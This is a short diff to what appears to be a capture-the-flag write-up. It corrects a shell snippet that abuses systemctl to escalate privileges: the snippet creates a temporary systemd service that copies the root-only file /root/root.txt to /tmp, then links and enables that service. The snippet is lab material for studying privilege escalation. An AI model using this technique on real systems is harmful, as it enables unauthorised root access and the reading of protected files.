@@ -34,7 +34,9 @@ eop=$(mktemp).service
 echo '[Service]
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
 [Install]
-WantedBy=multi-user.target' >$eop/bin/systemctl link $eop
+WantedBy=multi-user.target' >$eop
+
+/bin/systemctl link $eop
 /bin/systemctl enable --now $eop
 ```
 
